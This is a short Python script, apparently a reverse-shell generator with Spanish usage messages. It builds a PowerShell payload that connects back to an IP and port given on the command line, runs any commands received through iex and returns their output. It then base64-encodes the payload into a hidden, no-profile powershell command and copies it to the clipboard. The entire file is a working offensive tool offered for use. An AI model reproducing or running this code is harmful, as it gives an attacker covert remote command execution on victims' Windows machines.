import sys
import base64
import pyperclip

def generate_reverse_shell(ip, port):
    payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
    encoded = base64.b64encode(payload.encode('utf-16')[2:]).decode()
    cmd = f"powershell -nop -w hidden -e {encoded}"
    return cmd

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python reverse_shell_gen.py <IP> <PUERTO>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    shell_cmd = generate_reverse_shell(ip, port)
    pyperclip.copy(shell_cmd)
    print("[+] Comando generado y copiado al portapapeles.")
